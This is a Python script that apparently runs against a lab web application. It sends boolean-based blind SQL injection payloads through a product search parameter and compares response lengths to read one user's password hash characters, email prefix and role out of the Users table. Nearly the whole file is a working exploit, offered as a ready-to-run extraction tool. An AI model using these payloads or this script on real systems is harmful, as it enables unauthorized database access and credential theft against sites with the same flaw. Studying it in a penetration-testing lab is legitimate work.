#!/usr/bin/env python3
"""Boolean extraction channel verification and value extraction.
Deduced query: WHERE name LIKE '%' || <q> || '%'
"""
import json, sys, urllib.request, urllib.error

TARGET = "http://lab-mutator:3000"
OUT = sys.argv[1] if len(sys.argv) > 1 else "/workspace/reports/sqli_extract2.json"

def req(path):
    r = urllib.request.Request(TARGET + path, headers={"User-Agent": "Mozilla/5.0"})
    try:
        with urllib.request.urlopen(r, timeout=15) as resp:
            return resp.status, len(resp.read())
    except urllib.error.HTTPError as e:
        try:
            return e.code, len(e.read())
        except Exception:
            return e.code, 0

payloads = [
    ("q=Apple (benign baseline)", "/rest/products/search?q=Apple"),
    ("true: count(Users)>0", "/rest/products/search?q=%27%20OR%20(SELECT%20count(*)%20FROM%20Users)>0/**/"),
    ("false: count(Users)<1", "/rest/products/search?q=%27%20OR%20(SELECT%20count(*)%20FROM%20Users)<1/**/"),
    ("true: length(password)@uid13>30", "/rest/products/search?q=%27%20OR%20(SELECT%20length(password)%20FROM%20Users%20WHERE%20id=13)>30/**/"),
    ("false: length(password)@uid13<10", "/rest/products/search?q=%27%20OR%20(SELECT%20length(password)%20FROM%20Users%20WHERE%20id=13)<10/**/"),
    ("true: substr(password,1,1)@uid13='9'", "/rest/products/search?q=%27%20OR%20(substr((SELECT%20password%20FROM%20Users%20WHERE%20id=13),1,1))='9'/**/"),
    ("false: substr(password,1,1)@uid13='0'", "/rest/products/search?q=%27%20OR%20(substr((SELECT%20password%20FROM%20Users%20WHERE%20id=13),1,1))='0'/**/"),
    ("true: substr(email,1,6)@uid13='bjoer'", "/rest/products/search?q=%27%20OR%20(substr((SELECT%20email%20FROM%20Users%20WHERE%20id=13),1,6))='bjoer'/**/"),
    ("false: substr(email,1,6)@uid13='xjoer'", "/rest/products/search?q=%27%20OR%20(substr((SELECT%20email%20FROM%20Users%20WHERE%20id=13),1,6))='xjoer'/**/"),
    ("true: role@uid13='deluxe'", "/rest/products/search?q=%27%20OR%20((SELECT%20role%20FROM%20Users%20WHERE%20id=13))='deluxe'/**/"),
    ("false: role@uid13='admin'", "/rest/products/search?q=%27%20OR%20((SELECT%20role%20FROM%20Users%20WHERE%20id=13))='admin'/**/"),
]

results = []
for name, path in payloads:
    st, blen = req(path)
    results.append({"test": name, "status": st, "body_length": blen})
    print(f"{name}: status={st} body_length={blen}")

with open(OUT, "w") as f:
    json.dump(results, f, indent=1)
print(f"Wrote {OUT}", file=sys.stderr)
